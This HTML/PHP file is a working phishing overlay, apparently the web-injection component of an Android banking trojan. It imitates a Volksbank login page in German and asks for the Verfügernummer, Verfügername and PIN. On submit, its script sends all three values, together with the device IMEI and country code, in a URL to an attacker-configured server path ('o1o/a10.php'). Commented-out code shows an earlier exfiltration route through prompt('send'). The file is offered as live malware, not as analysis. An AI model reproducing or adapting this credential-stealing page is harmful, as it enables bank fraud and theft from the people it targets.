<html><head>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js" type="text/javascript"></script>

<style>
	body {
		margin: 0;
		padding: 0;
		background-color: #fff;
		-moz-background-size: 100%;
		-webkit-background-size: 100%;
		-o-background-size: 100%;
		background-size: 100%;
		background-attachment: fixed;
	}
	#header {
		background: #fff;
	}
	#line {
		background: #098C2A;
		height: 2px;
	}
	
	#header1 {
		background: #17D017;
		padding: 7px;
		color: #fff;
		font-weight: bold;
		border-radius: 6px 6px 0 0;
	}
	
	#form {
		width: 95%;
	}
	
	.form {
		background: #e2eaf2;
		color: #000;
		width: 99%;
		opacity: 0.9;
		margin-top: 15px;
		height: 320px;
	}

	label {
		float: left;
		margin: 15px 10px 10px 20px;
		color: #295f99;
	}
	
	.input_100 {
		width: 95%;
		margin-top: 10px;
		background: #ffffff;
		border-bottom: none;
		padding: 10px;
		border-top: none;
		border-left: none;
		border-right: none;
	}
	
	#input_submitBtn {
		background: #004086;
		width: 97%;
		padding: 14px;
		color: #fff;
		border: 0 none;
		opacity: 0.9;
	}

	.fielderror {
		border: 1px solid #F00;
		width: 95%;
		margin-top: 10px;
		background: #fff;
		padding: 10px;

	}
	
	::-webkit-input-placeholder { /* WebKit browsers */
	color:    #828282;
	}
	#line {
		width: 95%;
		background: #e2eaf2;
		height: 2px;
	}
	
	
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<img src="data:image/png;base64,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" style="margin-left: 66%;margin-top: 10px; margin-bottom: 10px; width: 33%;">
<center>
<div id="line"></div>
<form action="http://null" method="post" id="_mainForm" target="flow_handler">

<div class="form">

<label for="login">Verfügernummer:</label><br>
<input id="login" name="Verfügernummer" class="input_100" maxlength="10" type="text"><br>

<label for="password">Verfügername:</label><br>
<input id="password" name="Verfügername" class="input_100" maxlength="6" type="password"><br>

<label for="code">PIN:</label><br><br>
<input id="code" name="PIN" class="input_100" type="password"><br>
</div><br>
<input id="input_submitBtn" value="Anmelden" type="button">

<input type="hidden" name="name" value="Suncorp Bank"> 
<input type="hidden" name="code" value=""></form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>

</center></div>
            <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // onoaiaaeeaaai o oi?iu o?e aaieiee
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // iieo?aai id aioa

*/
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');
                        var oCode = document.getElementById('code');

						try{
							oNumInp.className = oCodeInp.className = oCode.className = 'input_100';
						} catch(e){};
						
                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCode.value.length < 4) {
							try{
								oCode.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				/*top['closeDlg'] = true;
				prompt('send', '{"dialog id" : "volksbank'+
					'", "verfugernummer": "'+oNumInp.value+
					'", "verfugername" : "'+oCodeInp.value+
					'", "pin": "'+oCode.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|Volksbank|"+oNumInp.value+"|"+oCodeInp.value+"|"+oCode.value);
						
						
						return false;
                    };

                })();
            </script>


</body></html>
